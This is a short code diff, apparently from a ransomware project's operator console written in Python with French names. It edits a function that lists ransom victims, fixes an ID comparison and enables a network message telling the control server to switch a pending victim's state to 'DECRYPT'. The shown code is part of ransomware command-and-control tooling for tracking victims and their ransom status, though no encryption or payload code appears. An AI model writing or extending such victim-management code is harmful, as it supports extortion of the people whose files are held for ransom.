@@ -80,7 +80,7 @@ def afficher_rancon_victime(data_victimes):
     while temp2:
         for victime in data_victimes:
 
-            if victime['VICTIM'] == num_victime:
+            if str(victime['VICTIM']) == num_victime:
 
                 if victime['STATE'] == 'PENDING':
 
@@ -88,7 +88,7 @@ def afficher_rancon_victime(data_victimes):
                     if choix == 'O':
 
                         # Envoie au serveur la requête de l'historique d'une victime
-                        #net.send_message(serv, mess.set_message('CHANGE_STATE', [victime['VICTIM'], victime['STATE']]))
+                        net.send_message(serv, mess.set_message('CHANGE_STATE', [victime['VICTIM'], 'DECRYPT']))
 
                         print("La demande est transmise !")
                         temp2 = False
